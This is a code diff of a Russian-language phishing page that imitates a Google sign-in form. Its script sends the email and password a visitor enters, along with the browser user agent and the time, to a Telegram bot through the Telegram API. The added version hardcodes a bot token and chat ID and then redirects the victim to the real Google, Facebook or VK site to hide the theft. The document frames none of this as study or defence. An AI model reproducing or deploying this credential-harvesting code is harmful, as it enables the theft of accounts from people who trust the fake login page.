@@ -14,7 +14,7 @@
       height: 100vh;
       margin: 0;
     }
-    .login-container {
+    .container {
       background-color: white;
       padding: 20px;
       border-radius: 8px;
@@ -22,12 +22,12 @@
       width: 300px;
       text-align: center;
     }
-    .login-container h2 {
+    .container h1 {
       margin-bottom: 20px;
       font-size: 24px;
       color: #202124;
     }
-    .login-container input {
+    .container input {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
@@ -35,7 +35,7 @@
       border-radius: 4px;
       font-size: 14px;
     }
-    .login-container button {
+    .container button {
       width: 100%;
       padding: 10px;
       background-color: #4285F4;
@@ -45,20 +45,15 @@
       font-size: 16px;
       cursor: pointer;
     }
-    .login-container button:hover {
+    .container button:hover {
       background-color: #357ABD;
-    }
-    .login-container .logo {
-      width: 100px;
-      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <img src="google-icon.png" alt="Google" class="logo"> <!-- Логотип Google -->
-    <h2>Войдите в аккаунт Google</h2>
-    <form id="loginForm">
+  <div class="container">
+    <h1>Вход через Google</h1>
+    <form onsubmit="sendData(event, 'google')">
       <input type="email" id="email" placeholder="Email" required>
       <input type="password" id="password" placeholder="Пароль" required>
       <button type="submit">Войти</button>
@@ -66,41 +61,63 @@
   </div>
 
   <script>
-    // Функция для отправки данных в Telegram
-    function sendToTelegram(message) {
-      const botToken = "YOUR_BOT_TOKEN"; // Замените на токен вашего бота
-      const chatId = "YOUR_CHAT_ID"; // Замените на ваш chat_id
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    // Токен вашего бота и chat_id
+    const BOT_TOKEN = "7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0";  // Замените на токен вашего бота
+    const CHAT_ID = "7947290290";      // Замените на ваш chat_id
 
-      fetch(url)
-        .then(response => response.json())
-        .then(data => {
-          console.log("Сообщение отправлено в Telegram:", data);
-        })
-        .catch(error => {
-          console.error("Ошибка отправки сообщения:", error);
-        });
-    }
-
-    // Обработка отправки формы
-    document.getElementById("loginForm").onsubmit = function (event) {
+    // Функция для отправки данных
+    function sendData(event, service) {
       event.preventDefault(); // Отменяем стандартное поведение формы
 
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+      // Получаем данные из формы
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Получаем информацию о пользователе
+      const user_ip = ''; // IP-адрес можно получить через сторонний сервис (например, ipify)
+      const user_agent = navigator.userAgent;
+      const current_time = new Date().toLocaleString();
 
       // Формируем сообщение для Telegram
-      const message = `Новый вход через Google:\nEmail: ${email}\nПароль: ${password}`;
+      const message = `
+    Новый вход через ${service}:
+    Время: ${current_time}
+    IP: ${user_ip}
+    User-Agent: ${user_agent}
+    Email: ${email}
+    Пароль: ${password}
+      `;
 
       // Отправляем данные в Telegram
-      sendToTelegram(message);
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const params = {
+        chat_id: CHAT_ID,
+        text: message
+      };
 
-      // Оповещение пользователя
-      alert("Данные отправлены. Перенаправление...");
-
-      // Перенаправление на другую страницу (например, главную)
-      window.location.href = "/";
-    };
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Данные отправлены в Telegram:', data);
+        // Перенаправление на оригинальный сайт
+        if (service === 'google') {
+          window.location.href = 'https://google.com';
+        } else if (service === 'facebook') {
+          window.location.href = 'https://facebook.com';
+        } else if (service === 'vk') {
+          window.location.href = 'https://vk.com';
+        }
+      })
+      .catch(error => {
+        console.error('Ошибка отправки данных:', error);
+      });
+    }
   </script>
 </body>
 </html>
